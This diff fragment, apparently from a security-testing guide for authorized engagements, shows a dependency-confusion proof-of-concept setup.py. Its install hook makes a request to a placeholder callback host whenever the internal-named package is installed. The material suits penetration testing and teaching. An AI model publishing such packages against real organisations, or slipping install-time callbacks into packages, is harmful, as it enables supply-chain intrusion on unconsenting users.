@@ -116,11 +116,14 @@ Routing note: after package-name enumeration, consider PoC only in authorized en
 from setuptools import setup
 from setuptools.command.install import install
 
+
 class PoCInstall(install):
     def run(self):
         import urllib.request
+
         urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
         install.run(self)
+
 
 setup(
     name="some-internal-package-name",
